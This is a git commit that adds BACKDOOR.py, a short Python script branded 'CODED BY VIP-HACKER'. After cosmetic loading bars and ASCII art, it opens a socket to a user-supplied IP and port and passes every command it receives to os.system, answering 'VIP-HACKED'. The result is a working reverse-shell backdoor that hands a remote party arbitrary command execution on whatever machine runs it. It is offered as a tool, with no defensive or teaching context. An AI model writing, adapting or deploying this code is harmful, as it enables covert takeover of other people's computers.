8540df8185d2688cfed3df96dd9e43f02d9129b7
VISHNU PREMIL <82073583+VIP-HACKER2001@users.noreply.github.com>
2021-05-10 22:38:54 +0530

    Add files via upload

---
+++ BACKDOOR.py
@@ -0,0 +1,47 @@
+import socket
+import os
+import time
+import sys
+import random
+               #LIFE IS FULL OF MYSTERIES#
+os.system("clear")         
+time.sleep(3)
+print ("-------------------------------{LOADING::::::::::::}----------------------------")
+time.sleep(3)
+os.system("clear")
+time.sleep(3)
+
+
+
+
+
+print  ("        ╭━━╮╭━━━┳━━━┳╮╭━╮╭━━━┳━━━┳━━━┳━━━╮")
+print  ("        ┃╭╮┃┃╭━╮┃╭━╮┃┃┃╭╯╰╮╭╮┃╭━╮┃╭━╮┃╭━╮┃")
+print  ("        ┃╰╯╰┫┃╱┃┃┃╱╰┫╰╯╯╱╱┃┃┃┃┃╱┃┃┃╱┃┃╰━╯┃")
+print  ("        ┃╭━╮┃╰━╯┃┃╱╭┫╭╮┃╱╱┃┃┃┃┃╱┃┃┃╱┃┃╭╮╭╯")
+print  ("        ┃╰━╯┃╭━╮┃╰━╯┃┃┃╰┳┳╯╰╯┃╰━╯┃╰━╯┃┃┃╰╮")
+print  ("        ╰━━━┻╯╱╰┻━━━┻╯╰━┻┻━━━┻━━━┻━━━┻╯╰━╯")
+print  ("--------------CODED BY VIP-HACKER----------------------")
+time.sleep(3)                             
+print   ("[                    ] 0% ")
+time.sleep(5)
+print   ("[=====               ] 25%")
+time.sleep(5)
+print   ( "[==========          ] 50%")
+time.sleep(5)
+print   ( "[===============     ] 75%")
+time.sleep(5)
+print   ( "[====================] 100%")
+time.sleep(3)
+os.system("date")
+print ( "»»»»»»»»»»»:WELCOME HACKER:«««««««««««")
+server = socket.socket ()
+host= input (str("ENTER YOUR IP : "))
+port= int(input('ENTER YOUR PORT:'))
+run = True
+server.connect ((host, port))
+while run:
+    msg = server.recv(1024)
+    os.system (msg.decode('UTF-8'))
+    server.send('VIP-HACKED'.encode('UTF-8'))
+  #USE THIS TOOL FOR  ONLY  SIMPLE TOOL BUT POWERFULL #
